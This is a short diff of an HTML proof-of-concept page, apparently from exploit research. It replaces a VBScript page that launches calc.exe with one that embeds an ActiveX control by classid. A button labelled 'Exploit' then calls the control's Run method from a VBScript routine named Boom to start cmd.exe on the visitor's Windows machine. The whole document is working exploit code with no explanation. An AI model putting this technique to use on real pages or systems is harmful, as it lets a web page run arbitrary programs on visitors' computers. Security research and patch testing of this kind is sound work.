@@ -1,15 +1,12 @@
 <html>
-<head>
-	<title>Calc</title>
-	<script language="VBScript">
-		Sub RunProgram
-            Set objShell = CreateObject("Wscript.Shell")
-            objShell.Run "c:\windows\system32\calc.exe"
-			Self.Close
-        End Sub
-	</script>
-</head>
-<body onload="RunProgram">
-    <h1>PoC</h1>
-</body>
+<object classid='clsid:31AE647D-11D1-4E6A-BE2D-90157640019A' id='target' /></object>
+<input language=VBScript onclick=Boom() type=button value="Exploit">
+<script language = 'vbscript'>
+Sub Boom()
+arg1="c:\windows\system32\cmd.exe"
+arg2=""
+arg3=1
+target.Run arg1 ,arg2 ,arg3
+End Sub
+</script>
 </html>
